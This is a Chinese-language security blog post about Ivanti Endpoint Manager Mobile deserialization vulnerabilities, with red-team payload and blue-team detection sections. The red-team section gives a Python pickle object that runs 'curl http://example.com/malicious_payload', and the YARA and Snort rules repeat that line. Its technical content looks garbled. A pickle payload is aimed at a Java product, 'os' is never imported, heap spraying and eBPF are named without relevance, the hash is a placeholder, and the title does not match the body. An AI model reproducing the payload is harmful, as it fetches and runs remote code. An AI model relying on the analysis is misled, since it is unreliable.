---
layout: post
title:  "One threat actor responsible for 83% of recent Ivanti RCE attacks"
date:   2026-02-14 18:25:21 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Ivanti Endpoint Manager Mobile 中的 CVE-2026-21962 和 CVE-2026-24061 漏洞利用
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Deserialization, Heap Spraying, eBPF

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Ivanti Endpoint Manager Mobile 中的 CVE-2026-21962 和 CVE-2026-24061 漏洞是由於 deserialization 處理不當引起的。具體來說，當系統接收到一個序列化的物件時，沒有進行適當的驗證和過濾，導致攻擊者可以注入惡意代碼。
* **攻擊流程圖解**: 
  1. 攻擊者發送一個序列化的物件到 Ivanti Endpoint Manager Mobile 服務器。
  2. 服務器接收到序列化的物件並進行 deserialization。
  3. 如果序列化的物件包含惡意代碼，則惡意代碼會被執行。
* **受影響元件**: Ivanti Endpoint Manager Mobile 12.5.0.x, 12.6.0.x, 12.7.0.x

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 Ivanti Endpoint Manager Mobile 服務器的 IP 地址和端口號。
* **Payload 建構邏輯**: 
    * 攻擊者可以使用以下 Python 代碼構建一個序列化的物件：

```

python
import pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://example.com/malicious_payload',))

exploit = Exploit()
serialized_exploit = pickle.dumps(exploit)

```
    * 攻擊者可以使用 `curl` 或 `nmap` 等工具發送序列化的物件到 Ivanti Endpoint Manager Mobile 服務器。
* **繞過技術**: 攻擊者可以使用 eBPF 等技術繞過 WAF 和 EDR 的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**: 

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 193.24.123.42 | example.com | /usr/local/bin/malicious_payload |* **偵測規則 (Detection Rules)**: 
  * YARA Rule:

    ```
    
    yara
    rule Exploit {
      meta:
        description = "Ivanti Endpoint Manager Mobile Exploit"
      strings:
        $a = "curl http://example.com/malicious_payload"
      condition:
        $a
    }
    
    ```
  * Snort/Suricata Signature:

    ```
    
    snort
    alert tcp any any -> any 8080 (msg:"Ivanti Endpoint Manager Mobile Exploit"; content:"curl http://example.com/malicious_payload"; sid:1000001; rev:1;)
    
    ```
* **緩解措施**: 
  * 更新 Ivanti Endpoint Manager Mobile 到最新版本。
  * 使用 WAF 和 EDR 等安全工具進行檢測和防禦。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization**: Deserialization 是指將序列化的物件轉換回原始的物件。這個過程中，如果沒有進行適當的驗證和過濾，可能會導致安全漏洞。
* **Heap Spraying**: Heap Spraying 是指在堆中分配大量的記憶體空間，以便於攻擊者注入惡意代碼。
* **eBPF**: eBPF (extended Berkeley Packet Filter) 是一種 Linux 內核技術，允許用戶空間程序注入和執行內核代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/one-threat-actor-responsible-for-83-percent-of-recent-ivanti-rce-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


